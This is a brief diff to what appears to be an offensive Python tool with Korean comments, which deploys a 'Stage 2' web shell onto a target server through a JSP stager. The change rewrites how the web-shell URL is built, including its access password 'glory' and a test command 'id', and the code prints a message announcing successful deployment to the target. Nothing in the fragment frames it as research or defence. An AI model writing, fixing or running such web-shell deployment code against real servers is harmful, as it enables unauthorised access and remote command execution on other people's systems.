@@ -162,7 +162,8 @@ class Stage2UploadUseCase:
         self.file_server.stop()
 
         # Step 4. 결과 안내
-        stage2_url = f"{self.config.stager_url.rsplit('/yaho4.jsp', 1)[0].rsplit('/', 2)[0]}/{self.config.stage2_file}?pwd=glory&cmd=id"
+        base_url = urllib.parse.urlparse(self.config.stager_url)
+        stage2_url = f"{base_url.scheme}://{base_url.netloc}/{self.config.stage2_file}?pwd=glory&cmd=id"
         if self.config.stage2_file in check_output:
             print(f"\n[✅ 성공!] Stage 2 웹쉘이 타겟 서버에 배포되었습니다!")
         else:
